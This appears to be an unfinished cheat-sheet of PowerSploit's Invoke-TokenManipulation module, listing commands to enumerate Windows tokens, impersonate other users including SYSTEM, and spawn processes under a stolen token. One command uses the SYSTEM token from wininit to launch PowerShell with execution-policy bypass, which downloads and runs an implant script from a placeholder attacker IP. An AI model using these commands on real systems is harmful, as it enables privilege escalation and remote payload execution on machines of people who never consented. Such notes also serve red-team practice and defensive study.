# PowerSploit

## 01 - Invoke-TokenManipulation

TODO: Write more information related to this powersploit module

```
PS C:\> Invoke-TokenManipulation -Enumerate
```

Impersonate current token.

```
PS C:\> Invoke-TokenManipulation -ImpersonateUser -UserName "<domain>\<username>"

PS C:\> Invoke-TokenManipulation -ImpersonateUser -Username "NT AUTHORITY\SYSTEM"
```

Enumerate current privileges.

```
PS C:\> Invoke-TokenManipulation -WhoAmI
```

To execute with a new process with arguments after obtaining the new token.

```
PS C:\> Invoke-TokenManipulation -CreateProcess "cmd.exe"

PS C:\> Get-Process wininit | Invoke-TokenManipulation -CreateProcess "powershell.exe -nop -exec bypass -c \"IEX (New-Object Net.WebClient).DownloadString('http[s]://<attacker_IP>/implant.ps1');\"};"
```

Reverting back to the current token.

```
PS C:\> Invoke-TokenManipulation -RevToSelf
```